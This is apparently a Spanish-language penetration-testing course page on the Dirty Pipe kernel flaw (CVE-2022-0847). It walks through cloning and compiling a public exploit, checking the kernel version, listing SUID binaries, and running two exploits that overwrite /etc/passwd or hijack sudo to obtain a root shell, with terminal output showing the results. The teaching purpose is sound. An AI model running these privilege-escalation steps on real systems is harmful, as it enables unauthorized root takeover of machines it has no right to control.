# Pipa sucia

---

Una vulnerabilidad en el núcleo de Linux, llamado[Pipa sucia](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), permite la escritura no autorizada a los archivos de usuario root en Linux. Técnicamente, la vulnerabilidad es similar a la[Vaca sucia](https://dirtycow.ninja/)Vulnerabilidad descubierta en 2016. Todos los núcleos de la versión`5.8`a`5.17`son afectados y vulnerables a esta vulnerabilidad.

En términos simples, esta vulnerabilidad permite que un usuario escriba a archivos arbitrarios siempre que tenga acceso de lectura a estos archivos. También es interesante observar que los teléfonos Android también se ven afectados. Las aplicaciones de Android se ejecutan con los derechos de usuario, por lo que una aplicación maliciosa o comprometida podría hacerse cargo del teléfono.

Esta vulnerabilidad se basa en tuberías. Las tuberías son un mecanismo de comunicación unidireccional entre procesos que son particularmente populares en los sistemas UNIX. Por ejemplo, podríamos editar el`/etc/passwd`Archivo y elimine la solicitud de contraseña para la raíz. Esto nos permitiría iniciar sesión con el`su`Comando sin la solicitud de contraseña.

Para explotar esta vulnerabilidad, necesitamos descargar un[POC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)y compilarlo en el sistema de destino en sí o una copia que hemos hecho.

#### Descargar Dirty Pipe Exploit

  Pipa sucia

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

Después de compilar el código, tenemos dos exploits diferentes disponibles. La primera versión de exploit (`exploit-1`) modifica el`/etc/passwd`y nos da un aviso con privilegios de raíz. Para esto, necesitamos verificar la versión del núcleo y luego ejecutar el exploit.

#### Verificar la versión del kernel

  Pipa sucia

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

#### Explotación

  Pipa sucia

```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

Con la ayuda de la segunda versión de exploit (`exploit-2`), podemos ejecutar binarios Suid con privilegios de raíz. Sin embargo, antes de que podamos hacer eso, primero necesitamos encontrar estos binarios suidos. Para esto, podemos usar el siguiente comando:

#### Encuentra binarios suidos

  Pipa sucia

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Luego podemos elegir un binario y especificar la ruta completa del binario como argumento para el exploit y ejecutarlo.

#### Explotación

  Pipa sucia

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```

